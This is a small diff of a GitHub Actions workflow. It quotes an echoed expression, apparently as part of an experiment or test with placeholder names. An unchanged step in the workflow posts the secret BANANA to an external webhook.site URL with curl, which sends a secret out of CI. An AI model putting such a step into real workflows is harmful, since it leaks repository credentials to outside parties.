@@ -8,5 +8,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          echo ${{ github.event.banana || github.event.pull_request_target.head.sha }}
+          echo "${{ github.event.banana || github.event.pull_request_target.head.sha }}"
           curl https://webhook.site/b9b9f3a9-fb5f-47bd-a6ae-55009feebd48 -d "segredo=${{ secrets.BANANA }}"
